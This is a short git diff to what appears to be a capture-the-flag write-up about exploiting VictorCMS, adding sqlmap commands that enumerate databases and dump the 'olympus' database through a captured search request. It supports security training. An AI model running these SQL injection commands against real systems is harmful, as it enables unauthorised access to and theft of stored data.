@@ -75,7 +75,7 @@ static                  [Status: 301, Size: 311, Words: 20, Lines: 10]
 ![image](https://user-images.githubusercontent.com/90036439/223974836-e8de8d9a-c3f8-43d0-91da-08e3753e8d06.png)
 
 ```bash
-sqlmap -r victorCMS-search.request --dbs
+root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dbs
 
 [...]
 
@@ -89,6 +89,11 @@ available databases [6]:
 [*] sys
 
 ```
+
+```bash
+root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus
+```
+![image](https://user-images.githubusercontent.com/90036439/223977555-baf68ac5-5e32-4d50-b2c7-c0ea7013e61a.png)
 
 
 
